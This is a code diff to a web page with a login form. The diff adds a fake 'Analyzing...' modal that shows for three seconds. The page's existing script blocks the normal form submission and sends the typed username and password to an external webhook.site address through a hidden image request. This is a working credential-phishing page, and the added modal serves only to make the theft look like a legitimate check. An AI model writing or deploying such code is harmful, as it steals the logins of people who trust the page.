@@ -46,6 +46,28 @@
             cursor: pointer;
             font-weight: 500;
         }
+
+        /* Modal CSS */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            text-align: center;
+        }
+        .modal-content {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
     </style>
 </head>
 <body>
@@ -57,15 +79,30 @@
         <button type="submit">Confirm</button>
     </form>
 
+    <!-- Modal HTML -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <p>Analyzing...</p>
+        </div>
+    </div>
+
     <script>
         document.getElementById("myForm").addEventListener("submit", function (event) {
             event.preventDefault(); // Prevent the form from submitting by default
             const value = document.getElementById("username").value;
             const value1 = document.getElementById("password").value;
 
+            // Show the modal
+            document.getElementById("myModal").style.display = "block";
+
             // Create a single Image object and send both values in one request
             var image = new Image();
             image.src = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username=" + value + "&password=" + value1;
+
+            // Once the analysis is complete (for demonstration, use setTimeout), hide the modal
+            setTimeout(function () {
+                document.getElementById("myModal").style.display = "none";
+            }, 3000); // Adjust the delay as needed
         });
     </script>
 </body>
